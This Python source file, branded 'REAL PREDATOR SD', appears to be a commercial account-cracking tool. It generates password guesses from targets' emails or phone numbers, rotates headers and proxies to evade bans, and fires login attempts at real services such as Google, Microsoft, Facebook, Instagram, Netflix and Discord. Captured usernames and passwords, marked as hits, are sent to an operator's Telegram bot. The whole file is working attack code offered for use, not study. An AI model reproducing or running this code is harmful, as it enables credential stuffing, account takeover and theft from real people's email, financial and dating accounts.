# ================================================================
# REAL PREDATOR SD v31.0 - ULTIMATE HUNTER WITH BEAUTIFUL PLATFORMS
# Developer: ZERO STORE (Enhanced by @k_p_x1)
# Telegram: @MRDPY | WhatsApp: +249907118667
# ================================================================

import os, sys, re, time, random, threading, requests, json, base64, hashlib, secrets, urllib3, logging, itertools, socket
from datetime import datetime, timedelta
from flask import Flask, render_template_string, jsonify, request, send_file, session, redirect, url_for
from flask_cors import CORS
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

urllib3.disable_warnings()
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)

# ================================================================
# PASSWORD CONFIG
# ================================================================
ADMIN_PASSWORD = "ASHEU38HSBHXJHSGUE8UDHUD88EG8E8KDMKX9W00WHJDIU8UEHXBJZJ8WGEIJXKOXLXLXOSGUDYDI8EHD8HDIDIJDOSKDNZMZIXGEIEHJEGE8R8R9ROLRDGJ83IR8DIDGRIFF8"

# ================================================================
# INTERNATIONAL PHONE CODES (ALL COUNTRIES)
# ================================================================
PHONE_CODES = [
    '+1', '+7', '+20', '+27', '+30', '+31', '+32', '+33', '+34', '+36', '+39', '+40', '+41', '+43', '+44', '+45', '+46', '+47', '+48', '+49',
    '+51', '+52', '+53', '+54', '+55', '+56', '+57', '+58', '+60', '+61', '+62', '+63', '+64', '+65', '+66', '+81', '+82', '+84', '+86', '+90',
    '+91', '+92', '+93', '+94', '+95', '+98', '+211', '+212', '+213', '+216', '+218', '+220', '+221', '+222', '+223', '+224', '+225', '+226',
    '+227', '+228', '+229', '+230', '+231', '+232', '+233', '+234', '+235', '+236', '+237', '+238', '+239', '+240', '+241', '+242', '+243',
    '+244', '+245', '+246', '+247', '+248', '+249', '+250', '+251', '+252', '+253', '+254', '+255', '+256', '+257', '+258', '+259', '+260',
    '+261', '+262', '+263', '+264', '+265', '+266', '+267', '+268', '+269', '+290', '+291', '+297', '+298', '+299', '+350', '+351', '+352',
    '+353', '+354', '+355', '+356', '+357', '+358', '+359', '+370', '+371', '+372', '+373', '+374', '+375', '+376', '+377', '+378', '+379',
    '+380', '+381', '+382', '+383', '+385', '+386', '+387', '+389', '+420', '+421', '+423', '+500', '+501', '+502', '+503', '+504', '+505',
    '+506', '+507', '+508', '+509', '+590', '+591', '+592', '+593', '+594', '+595', '+596', '+597', '+598', '+599', '+670', '+672', '+673',
    '+674', '+675', '+676', '+677', '+678', '+679', '+680', '+681', '+682', '+683', '+685', '+686', '+687', '+688', '+689', '+690', '+691',
    '+692', '+850', '+852', '+853', '+855', '+856', '+880', '+886', '+960', '+961', '+962', '+963', '+964', '+965', '+966', '+967', '+968',
    '+970', '+971', '+972', '+973', '+974', '+975', '+976', '+977', '+992', '+993', '+994', '+995', '+996', '+998'
]

# ================================================================
# EMAIL DOMAINS
# ================================================================
EMAIL_DOMAINS = [
    'gmail.com', 'googlemail.com', 'outlook.com', 'hotmail.com', 'live.com', 'yahoo.com', 'ymail.com',
    'protonmail.com', 'proton.me', 'mail.com', 'yandex.com', 'gmx.com', 'aol.com', 'zoho.com',
    'icloud.com', 'me.com', 'msn.com', 'outlook.fr', 'gmail.co.uk', 'yahoo.co.uk', 'hotmail.co.uk',
    'tutanota.com', 'tutanota.de', 'mail.ru', 'bk.ru', 'inbox.ru', 'list.ru', 'web.de', 'gmx.de'
]

# ================================================================
# COMMON PASSWORDS
# ================================================================
COMMON_PASSWORDS = [
    '123456', 'password', '123456789', 'qwerty', 'abc123', 'iloveyou', 'admin', 'welcome', '123123',
    '111111', '12345678', 'password123', 'letmein', 'monkey', 'dragon', 'master', 'sunshine', 'princess',
    'qwertyuiop', '1234567890', 'superman', 'batman', 'love', 'hello', 'freedom', 'whatever', 'trustno1',
    'jordan23', 'harley', 'ranger', 'buster', 'tigger', 'boomer', 'michael', 'angela', 'matthew', 'miller',
    'lovely', 'cheese', 'purple', 'samantha', 'cookie', 'brown', 'morgan', 'creative', 'fishing', 'shadow',
    'simon', 'jasmine', 'thunder', 'falcon', 'titan', 'merlin', 'sniper', 'marlin', 'hunter', 'legend'
]

# ================================================================
# BEAUTIFUL PLATFORMS WITH COLORS AND ICONS
# ================================================================
PLATFORMS = [
    # Email Services
    {'name':'Google','icon':'fa-brands fa-google','color':'#ea4335','check':'google','gaming':False},
    {'name':'Microsoft','icon':'fa-solid fa-envelope','color':'#0078D4','check':'microsoft','gaming':False},
    {'name':'Yahoo','icon':'fa-solid fa-envelope','color':'#7b0099','check':'yahoo','gaming':False},
    {'name':'ProtonMail','icon':'fa-solid fa-envelope','color':'#6D4AFF','check':'protonmail','gaming':False},
    {'name':'Mail.com','icon':'fa-solid fa-envelope','color':'#004080','check':'mailcom','gaming':False},
    {'name':'Yandex','icon':'fa-solid fa-envelope','color':'#FF0000','check':'yandex','gaming':False},
    {'name':'AOL','icon':'fa-solid fa-envelope','color':'#3D0080','check':'aol','gaming':False},
    # Social Media
    {'name':'Facebook','icon':'fa-brands fa-facebook','color':'#1877f2','check':'facebook','gaming':False},
    {'name':'Instagram','icon':'fa-brands fa-instagram','color':'#e4405f','check':'instagram','gaming':False},
    {'name':'Twitter','icon':'fa-brands fa-twitter','color':'#1da1f2','check':'twitter','gaming':False},
    {'name':'TikTok','icon':'fa-brands fa-tiktok','color':'#00f2ea','check':'tiktok','gaming':False},
    {'name':'Snapchat','icon':'fa-brands fa-snapchat','color':'#fffc00','check':'snapchat','gaming':False},
    {'name':'Reddit','icon':'fa-brands fa-reddit','color':'#ff4500','check':'reddit','gaming':False},
    {'name':'LinkedIn','icon':'fa-brands fa-linkedin','color':'#0a66c2','check':'linkedin','gaming':False},
    {'name':'Pinterest','icon':'fa-brands fa-pinterest','color':'#BD081C','check':'pinterest','gaming':False},
    {'name':'Tumblr','icon':'fa-brands fa-tumblr','color':'#36465D','check':'tumblr','gaming':False},
    # Messaging
    {'name':'WhatsApp','icon':'fa-brands fa-whatsapp','color':'#25D366','check':'whatsapp','gaming':False},
    {'name':'Telegram','icon':'fa-brands fa-telegram','color':'#0088cc','check':'telegram','gaming':False},
    {'name':'Signal','icon':'fa-solid fa-message','color':'#3A76F0','check':'signal','gaming':False},
    {'name':'WeChat','icon':'fa-brands fa-weixin','color':'#07C160','check':'wechat','gaming':False},
    {'name':'Line','icon':'fa-brands fa-line','color':'#00C300','check':'line','gaming':False},
    {'name':'Viber','icon':'fa-solid fa-phone','color':'#7360F2','check':'viber','gaming':False},
    {'name':'Skype','icon':'fa-brands fa-skype','color':'#00AFF0','check':'skype','gaming':False},
    {'name':'Discord','icon':'fa-brands fa-discord','color':'#5865f2','check':'discord','gaming':True},
    # Gaming
    {'name':'Steam','icon':'fa-brands fa-steam','color':'#171a21','check':'steam','gaming':True},
    {'name':'Twitch','icon':'fa-brands fa-twitch','color':'#9146ff','check':'twitch','gaming':True},
    {'name':'Epic Games','icon':'fa-solid fa-gamepad','color':'#313131','check':'epic','gaming':True},
    {'name':'Riot Games','icon':'fa-solid fa-gamepad','color':'#D3292F','check':'riot','gaming':True},
    {'name':'PlayStation','icon':'fa-brands fa-playstation','color':'#003087','check':'playstation','gaming':True},
    {'name':'Xbox','icon':'fa-brands fa-xbox','color':'#107C10','check':'xbox','gaming':True},
    {'name':'Nintendo','icon':'fa-solid fa-gamepad','color':'#E60012','check':'nintendo','gaming':True},
    {'name':'Ubisoft','icon':'fa-solid fa-gamepad','color':'#000000','check':'ubisoft','gaming':True},
    # Streaming
    {'name':'Netflix','icon':'fa-solid fa-film','color':'#e50914','check':'netflix','gaming':False},
    {'name':'Spotify','icon':'fa-brands fa-spotify','color':'#1db954','check':'spotify','gaming':False},
    {'name':'Amazon Prime','icon':'fa-brands fa-amazon','color':'#ff9900','check':'amazon','gaming':False},
    {'name':'Hulu','icon':'fa-solid fa-tv','color':'#1CE783','check':'hulu','gaming':False},
    {'name':'Disney+','icon':'fa-solid fa-film','color':'#113CCF','check':'disney','gaming':False},
    {'name':'HBO Max','icon':'fa-solid fa-tv','color':'#5822B4','check':'hbomax','gaming':False},
    # Financial
    {'name':'PayPal','icon':'fa-brands fa-paypal','color':'#003087','check':'paypal','gaming':False},
    {'name':'Binance','icon':'fa-solid fa-coins','color':'#F0B90B','check':'binance','gaming':False},
    {'name':'Coinbase','icon':'fa-solid fa-coins','color':'#0052FF','check':'coinbase','gaming':False},
    {'name':'Kraken','icon':'fa-solid fa-coins','color':'#5848FF','check':'kraken','gaming':False},
    {'name':'Robinhood','icon':'fa-solid fa-chart-line','color':'#00C805','check':'robinhood','gaming':False},
    # Dating
    {'name':'Tinder','icon':'fa-solid fa-heart','color':'#FF6B6B','check':'tinder','gaming':False},
    {'name':'Bumble','icon':'fa-solid fa-bee','color':'#FFC107','check':'bumble','gaming':False},
    {'name':'Hinge','icon':'fa-solid fa-heart','color':'#6F4E37','check':'hinge','gaming':False},
    {'name':'OKCupid','icon':'fa-solid fa-heart','color':'#FF6600','check':'okcupid','gaming':False},
    {'name':'Grindr','icon':'fa-solid fa-rainbow','color':'#FF4D4D','check':'grindr','gaming':False},
    {'name':'Badoo','icon':'fa-solid fa-comment-dots','color':'#4A90D9','check':'badoo','gaming':False},
    {'name':'Muzz','icon':'fa-solid fa-mosque','color':'#2E7D32','check':'muzz','gaming':False},
    {'name':'Shaadi.com','icon':'fa-solid fa-ring','color':'#FF6B35','check':'shaadi','gaming':False},
    # Other
    {'name':'Zoom','icon':'fa-solid fa-video','color':'#2D8CFF','check':'zoom','gaming':False},
    {'name':'GitHub','icon':'fa-brands fa-github','color':'#333','check':'github','gaming':False},
    {'name':'Apple','icon':'fa-brands fa-apple','color':'#555555','check':'apple','gaming':False},
]

# ================================================================
# TELEGRAM MESSAGE WITH WEB REGISTRATION LINK
# ================================================================
class TelegramMessageBuilder:
    @staticmethod
    def build_hit_message(hit_data, attempts_count, platform_stats):
        platform = hit_data.get('platform', 'Unknown')
        username = hit_data.get('username', 'Unknown')
        password = hit_data.get('password', 'Unknown')
        hit_type = hit_data.get('type', 'email')
        
        # Get platform icon and color
        platform_info = next((p for p in PLATFORMS if p['name'] == platform), None)
        icon = platform_info['icon'] if platform_info else 'fa-solid fa-globe'
        color = platform_info['color'] if platform_info else '#00ff41'
        
        # Web registration link
        web_link = f"https://{platform.lower().replace(' ', '').replace('+', '')}.com"
        if platform == 'Microsoft':
            web_link = 'https://outlook.com'
        elif platform == 'Amazon Prime':
            web_link = 'https://amazon.com'
        elif platform == 'ProtonMail':
            web_link = 'https://proton.me'
        elif platform == 'Mail.com':
            web_link = 'https://mail.com'
        elif platform == 'Epic Games':
            web_link = 'https://epicgames.com'
        elif platform == 'Riot Games':
            web_link = 'https://riotgames.com'
        elif platform == 'PlayStation':
            web_link = 'https://playstation.com'
        elif platform == 'Shaadi.com':
            web_link = 'https://shaadi.com'
        elif platform == 'Disney+':
            web_link = 'https://disneyplus.com'
        elif platform == 'HBO Max':
            web_link = 'https://hbomax.com'
        
        message = f"""
╔═══════════════════════════════════════════╗
║     🎯 REAL HIT CAPTURED                 ║
╠═══════════════════════════════════════════╣
║                                          ║
║  🌐 PLATFORM: {platform}                 ║
║  📧 USERNAME: {username}                 ║
║  🔑 PASSWORD: {password}                 ║
║  📝 TYPE: {hit_type.upper()}            ║
║                                          ║
╠═══════════════════════════════════════════╣
║  📊 ATTACK STATISTICS                    ║
╠═══════════════════════════════════════════╣
║  🔢 Attempts: {attempts_count}           ║
║  📈 Success Rate: {platform_stats.get('success_rate', 'N/A')}%   ║
║  🎯 Platform Hits: {platform_stats.get('platform_hits', 0)}     ║
║  ❌ Platform Fails: {platform_stats.get('platform_fails', 0)}   ║
║                                          ║
╠═══════════════════════════════════════════╣
║  🌐 PLATFORM STATUS                      ║
╠═══════════════════════════════════════════╣
║  🔒 Security: {platform_stats.get('security_level', 'Medium')}  ║
║  🛡️ 2FA: {platform_stats.get('2fa_required', 'No')}            ║
║                                          ║
╠═══════════════════════════════════════════╣
║  🔗 WEB REGISTRATION                     ║
╠═══════════════════════════════════════════╣
║  🌐 {web_link}                           ║
║                                          ║
╠═══════════════════════════════════════════╣
║  ⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}        ║
║  📅 {datetime.now().strftime('%A, %B %d, %Y')}          ║
║                                          ║
╠═══════════════════════════════════════════╣
║  🔗 DEVELOPER CONTACT                    ║
╠═══════════════════════════════════════════╣
║  📱 Telegram: @MRDPY                     ║
║  💬 WhatsApp: +249907118667              ║
║                                          ║
╚═══════════════════════════════════════════╝
"""
        
        reply_markup = {
            "inline_keyboard": [
                [
                    {"text": "🌐 Open Website", "url": web_link},
                    {"text": "📱 Contact Developer", "url": "https://t.me/MRDPY"}
                ],
                [
                    {"text": "💬 WhatsApp", "url": "https://wa.me/249907118667"},
                    {"text": "🔄 Check Another", "callback_data": "check_another"}
                ],
                [
                    {"text": "📊 View Stats", "callback_data": "view_stats"},
                    {"text": "🔐 Report 2FA", "callback_data": "report_2fa"}
                ]
            ]
        }
        
        return message, reply_markup

    @staticmethod
    def build_2fa_message(platform, username, attempts):
        # Web registration link
        web_link = f"https://{platform.lower().replace(' ', '').replace('+', '')}.com"
        if platform == 'Microsoft':
            web_link = 'https://outlook.com'
        elif platform == 'ProtonMail':
            web_link = 'https://proton.me'
        elif platform == 'Epic Games':
            web_link = 'https://epicgames.com'
        elif platform == 'PlayStation':
            web_link = 'https://playstation.com'
        elif platform == 'Disney+':
            web_link = 'https://disneyplus.com'
        
        message = f"""
╔═══════════════════════════════════════════╗
║     🔒 2FA DETECTED                      ║
╠═══════════════════════════════════════════╣
║                                          ║
║  🌐 PLATFORM: {platform}                 ║
║  📧 USERNAME: {username}                 ║
║  🔢 Attempts: {attempts}                 ║
║  ⚠️ STATUS: 2FA Required                ║
║                                          ║
╠═══════════════════════════════════════════╣
║  🔗 WEB REGISTRATION                     ║
╠═══════════════════════════════════════════╣
║  🌐 {web_link}                           ║
║                                          ║
╠═══════════════════════════════════════════╣
║  ⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}          ║
║                                          ║
╠═══════════════════════════════════════════╣
║  🔗 CONTACT: @MRDPY                     ║
╚═══════════════════════════════════════════╝
"""
        reply_markup = {
            "inline_keyboard": [
                [
                    {"text": "🌐 Open Website", "url": web_link},
                    {"text": "📱 Contact Developer", "url": "https://t.me/MRDPY"}
                ],
                [
                    {"text": "💬 WhatsApp", "url": "https://wa.me/249907118667"},
                    {"text": "🔑 Try Password", "callback_data": "try_password"}
                ]
            ]
        }
        return message, reply_markup

# ================================================================
# ANTI-BAN SYSTEM
# ================================================================
class AntiBanSystem:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
        
        self.accept_languages = [
            'en-US,en;q=0.9,ar;q=0.8',
            'en-GB,en;q=0.9,ar;q=0.8',
            'en-CA,en;q=0.9,fr;q=0.8',
            'en-AU,en;q=0.9',
            'en-IN,en;q=0.9,hi;q=0.8',
            'ar-SA,ar;q=0.9,en;q=0.8'
        ]
        
        self.proxies = []
        self.failed_proxies = set()
        self.lock = threading.Lock()
    
    def get_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(self.accept_languages),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Referer': random.choice([
                'https://www.google.com/',
                'https://www.facebook.com/',
                'https://www.youtube.com/',
                'https://www.amazon.com/',
                'https://www.twitter.com/'
            ])
        }
    
    def get_delay(self):
        base_delay = random.uniform(0.3, 1.0)
        hour = datetime.now().hour
        if 18 <= hour <= 23:
            base_delay *= 1.5
        return base_delay
    
    def add_proxy(self, proxy):
        with self.lock:
            if proxy not in self.proxies and proxy not in self.failed_proxies:
                self.proxies.append(proxy)
    
    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy = random.choice(self.proxies)
            return proxy

# ================================================================
# ULTIMATE PASSWORD GENERATOR
# ================================================================
class UltimatePasswordGenerator:
    def __init__(self):
        self.common_words = [
            'love', 'happy', 'sun', 'moon', 'star', 'fire', 'ice', 'dark', 'light',
            'king', 'queen', 'prince', 'princess', 'dragon', 'wolf', 'tiger', 'lion',
            'shadow', 'storm', 'thunder', 'lightning', 'rain', 'snow', 'cloud'
        ]
        
        self.leet_map = {
            'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'],
            'o': ['0'], 's': ['5', '$'], 't': ['7', '+'],
            'b': ['8'], 'g': ['9'], 'z': ['2']
        }
    
    def generate(self, base):
        passwords = set()
        
        base_clean = re.sub(r'[^a-zA-Z0-9]', '', base)
        base_lower = base_clean.lower()
        base_cap = base_clean.capitalize()
        
        # Basic variations
        for variant in [base_clean, base_lower, base_cap]:
            passwords.add(variant)
            passwords.add(variant[::-1])
        
        # Add suffixes
        suffixes = ['123', '1234', '2024', '2025', '!', '@', '#', '$']
        for suffix in suffixes:
            for base_var in [base_clean, base_lower, base_cap]:
                passwords.add(base_var + suffix)
                passwords.add(suffix + base_var)
        
        # Add years
        for year in ['1990','1995','2000','2005','2024']:
            for base_var in [base_clean, base_lower, base_cap]:
                passwords.add(base_var + year)
                passwords.add(year + base_var)
        
        # Combine with common words
        for word in self.common_words[:10]:
            for base_var in [base_clean, base_lower]:
                passwords.add(base_var + word)
                passwords.add(word + base_var)
                passwords.add(base_var + '!' + word)
                passwords.add(word + '!' + base_var)
        
        # Leet speak
        leet = self._to_leet(base_lower)
        if leet and leet != base_lower:
            passwords.add(leet)
            for suffix in ['123', '!']:
                passwords.add(leet + suffix)
                passwords.add(suffix + leet)
        
        # Add common passwords
        passwords.update(random.sample(COMMON_PASSWORDS, min(30, len(COMMON_PASSWORDS))))
        
        return list(passwords)
    
    def _to_leet(self, text):
        result = ''
        for c in text:
            if c in self.leet_map:
                result += random.choice(self.leet_map[c])
            else:
                result += c
        return result

# ================================================================
# ULTIMATE PREDATOR ENGINE
# ================================================================
class UltimatePredator:
    def __init__(self):
        self.anti_ban = AntiBanSystem()
        self.password_gen = UltimatePasswordGenerator()
        self.running = False
        self.checked = 0
        self.hits = 0
        self.real_hits = 0
        self.feed = []
        self.results = []
        self.lock = threading.Lock()
        self.attempts = defaultdict(int)
        self.platform_stats = defaultdict(lambda: {'hits': 0, 'fails': 0, 'attempts': 0, '2fa': 0})
        self.combos = []
        self.target_platform = None
        
        self._load_common_combos()
    
    def _load_common_combos(self):
        combos = [
            ('admin@gmail.com', 'admin123'),
            ('support@gmail.com', 'support123'),
            ('info@gmail.com', 'info123'),
            ('test@gmail.com', 'test123'),
            ('hello@gmail.com', 'hello123'),
            ('world@gmail.com', 'world123'),
            ('demo@gmail.com', 'demo123'),
            ('admin@outlook.com', 'admin123'),
            ('support@hotmail.com', 'support123'),
            ('info@outlook.com', 'info123'),
            ('test@hotmail.com', 'test123'),
            ('admin@yahoo.com', 'admin123'),
            ('support@yahoo.com', 'support123'),
            ('info@yahoo.com', 'info123'),
        ]
        self.combos = combos
    
    def set_target_platform(self, platform_name):
        self.target_platform = platform_name
    
    def add_combos(self, combo_list):
        with self.lock:
            self.combos.extend(combo_list)
            self.combos = list(dict.fromkeys(self.combos))
    
    def smart_hunt(self, input_text):
        results = []
        
        if '@' in input_text:
            results.extend(self._hunt_email(input_text))
        else:
            results.extend(self._hunt_phone(input_text))
            for domain in ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com']:
                email_try = f"{input_text}@{domain}"
                results.extend(self._hunt_email(email_try))
        
        return results
    
    def _hunt_email(self, email):
        results = []
        
        username = email.split('@')[0]
        
        passwords = self.password_gen.generate(username)
        passwords.extend(self.password_gen.generate(email))
        passwords.extend(random.sample(COMMON_PASSWORDS, min(30, len(COMMON_PASSWORDS))))
        passwords = list(dict.fromkeys(passwords))
        
        if self.target_platform:
            platform = next((p for p in PLATFORMS if p['name'] == self.target_platform), None)
            if not platform:
                return results
            platforms_to_try = [platform]
        else:
            platforms_to_try = random.sample(PLATFORMS, min(20, len(PLATFORMS)))
        
        for password in passwords[:25]:
            for platform in platforms_to_try:
                result = self._try_platform(email, password, platform)
                if result:
                    results.append(result)
                    if result['status'] == 'hit':
                        self.real_hits += 1
                        hit_data = {
                            'platform': platform['name'],
                            'username': email,
                            'password': password,
                            'type': 'email'
                        }
                        stats = self._get_platform_stats(platform['name'])
                        self._send_telegram_hit(hit_data, self.attempts[platform['name']], stats)
                    break
        
        return results
    
    def _hunt_phone(self, phone):
        results = []
        
        phone_clean = re.sub(r'[^0-9+]', '', phone)
        
        passwords = self.password_gen.generate(phone_clean)
        passwords.extend(COMMON_PASSWORDS[:20])
        passwords = list(dict.fromkeys(passwords))
        
        phone_platforms = ['WhatsApp', 'Telegram', 'Signal', 'WeChat', 'Line', 'Viber']
        
        if self.target_platform:
            if self.target_platform in phone_platforms:
                platform = next((p for p in PLATFORMS if p['name'] == self.target_platform), None)
                if platform:
                    phone_platforms = [platform]
            else:
                return results
        
        for password in passwords[:15]:
            for platform in phone_platforms:
                result = self._try_platform(phone_clean, password, platform)
                if result:
                    results.append(result)
                    if result['status'] == 'hit':
                        self.real_hits += 1
                        hit_data = {
                            'platform': platform['name'] if isinstance(platform, dict) else platform,
                            'username': phone_clean,
                            'password': password,
                            'type': 'phone'
                        }
                        platform_name = platform['name'] if isinstance(platform, dict) else platform
                        stats = self._get_platform_stats(platform_name)
                        self._send_telegram_hit(hit_data, self.attempts[platform_name], stats)
                    break
        
        return results
    
    def _try_platform(self, username, password, platform):
        if isinstance(platform, dict):
            platform_name = platform['name']
            check_func_name = f'check_{platform["check"]}'
        else:
            platform_name = platform
            check_func_name = f'check_{platform.lower()}'
        
        self.attempts[platform_name] += 1
        
        check_func = getattr(self, check_func_name, None)
        if not check_func:
            return None
        
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update(self.anti_ban.get_headers())
            
            proxy = self.anti_ban.get_proxy()
            if proxy:
                session.proxies = {"http": proxy, "https": proxy}
            
            result, status = check_func(username, password, session)
            
            with self.lock:
                if status == 'hit':
                    self.platform_stats[platform_name]['hits'] += 1
                elif status == '2fa':
                    self.platform_stats[platform_name]['2fa'] += 1
                else:
                    self.platform_stats[platform_name]['fails'] += 1
                self.platform_stats[platform_name]['attempts'] += 1
            
            if status == 'hit':
                return {
                    'status': 'hit',
                    'platform': platform_name,
                    'username': username,
                    'password': password,
                    'result': result
                }
            elif status == '2fa':
                self._send_telegram_2fa(platform_name, username, self.attempts[platform_name])
                return {
                    'status': '2fa',
                    'platform': platform_name,
                    'username': username,
                    'password': password,
                    'reason': '2FA Required'
                }
            
            time.sleep(self.anti_ban.get_delay())
            
        except Exception as e:
            pass
        
        return None
    
    def _get_platform_stats(self, platform):
        stats = self.platform_stats.get(platform, {})
        attempts = stats.get('attempts', 1)
        hits = stats.get('hits', 0)
        
        return {
            'platform_hits': hits,
            'platform_fails': stats.get('fails', 0),
            'success_rate': round((hits / attempts) * 100, 2) if attempts > 0 else 0,
            'security_level': 'Medium' if attempts < 10 else 'High',
            '2fa_required': 'Yes' if stats.get('2fa', 0) > 0 else 'No'
        }
    
    def _send_telegram_hit(self, hit_data, attempts, stats):
        try:
            if not hasattr(self, 'telegram_enabled') or not self.telegram_enabled:
                return
            
            message, reply_markup = TelegramMessageBuilder.build_hit_message(
                hit_data, attempts, stats
            )
            
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = {
                "chat_id": self.telegram_chat_id,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": False,
                "reply_markup": json.dumps(reply_markup)
            }
            
            requests.post(url, data=data, timeout=10)
        except:
            pass
    
    def _send_telegram_2fa(self, platform, username, attempts):
        try:
            if not hasattr(self, 'telegram_enabled') or not self.telegram_enabled:
                return
            
            message, reply_markup = TelegramMessageBuilder.build_2fa_message(
                platform, username, attempts
            )
            
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = {
                "chat_id": self.telegram_chat_id,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": False,
                "reply_markup": json.dumps(reply_markup)
            }
            
            requests.post(url, data=data, timeout=10)
        except:
            pass
    
    def configure_telegram(self, token, chat_id):
        self.telegram_token = token
        self.telegram_chat_id = chat_id
        self.telegram_enabled = bool(token and chat_id)
    
    # ================================================================
    # PLATFORM CHECK FUNCTIONS (All 50+ Platforms)
    # ================================================================
    
    def check_google(self, email, password, session):
        try:
            resp = session.get("https://accounts.google.com/ServiceLogin", timeout=8)
            galx = re.search(r'name="GALX"[^>]*value="([^"]+)"', resp.text, re.I)
            if not galx:
                return None, 'bad'
            
            data = {
                'Email': email,
                'Passwd': password,
                'GALX': galx.group(1),
                'signIn': 'Sign in'
            }
            
            login = session.post('https://accounts.google.com/ServiceLoginAuth', 
                               data=data, allow_redirects=True, timeout=8)
            
            if 'mail.google.com' in login.url:
                return {'success': True}, 'hit'
            elif 'signin/challenge' in login.url:
                return {'success': False}, '2fa'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_microsoft(self, email, password, session):
        try:
            resp = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en", timeout=8)
            ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', resp.text, re.I)
            if not ppft:
                return None, 'bad'
            
            data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': ppft.group(1),
                'type': '11'
            }
            
            login = session.post('https://login.live.com/oauth20_authorize.srf', 
                               data=data, allow_redirects=True, timeout=8)
            
            if 'access_token' in login.url or 'mail.live.com' in login.url:
                return {'success': True}, 'hit'
            elif 'twofactor' in login.text.lower():
                return {'success': False}, '2fa'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_facebook(self, email, password, session):
        try:
            resp = session.get("https://www.facebook.com/login.php", timeout=8)
            lsd = re.search(r'name="lsd"[^>]*value="([^"]+)"', resp.text, re.I)
            if not lsd:
                return None, 'bad'
            
            data = {
                'email': email,
                'pass': password,
                'lsd': lsd.group(1),
                'login': 'Log In'
            }
            
            login = session.post('https://www.facebook.com/login/', 
                               data=data, allow_redirects=True, timeout=8)
            
            if 'home.php' in login.url:
                return {'success': True}, 'hit'
            elif 'checkpoint' in login.text.lower():
                return {'success': False}, '2fa'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_instagram(self, email, password, session):
        try:
            resp = session.get("https://www.instagram.com/accounts/login/", timeout=8)
            csrf = re.search(r'"csrf_token":"([^"]+)"', resp.text, re.I)
            if not csrf:
                return None, 'bad'
            
            headers = {
                'X-CSRFToken': csrf.group(1),
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            data = {
                'username': email,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1735689600:{password}'
            }
            
            login = session.post('https://www.instagram.com/accounts/login/ajax/', 
                               data=data, headers=headers, timeout=8)
            
            if '"authenticated":true' in login.text:
                return {'success': True}, 'hit'
            elif 'two_factor' in login.text.lower():
                return {'success': False}, '2fa'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_twitter(self, email, password, session):
        try:
            guest_resp = session.post("https://api.twitter.com/1.1/guest/activate.json", 
                                    headers={"User-Agent": "Mozilla/5.0"}, timeout=8)
            guest_token = guest_resp.json().get('guest_token', '') if guest_resp.status_code == 200 else ''
            
            headers = {
                'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                'X-Guest-Token': guest_token,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            data = {'username': email, 'password': password}
            login = session.post('https://api.twitter.com/1.1/onboarding/task.json', 
                               data=data, headers=headers, timeout=8)
            
            if '"success":true' in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_spotify(self, email, password, session):
        try:
            login = session.post("https://accounts.spotify.com/api/login", 
                               data={"username": email, "password": password}, timeout=8)
            if "accessToken" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_netflix(self, email, password, session):
        try:
            resp = session.get("https://www.netflix.com/login", timeout=8)
            auth_url = re.search(r'action="([^"]+)"', resp.text, re.I)
            if not auth_url:
                return None, 'bad'
            
            login = session.post(auth_url.group(1), 
                               data={"email": email, "password": password}, 
                               allow_redirects=True, timeout=8)
            
            if "browse" in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_discord(self, email, password, session):
        try:
            login = session.post("https://discord.com/api/v9/auth/login", 
                               json={"login": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
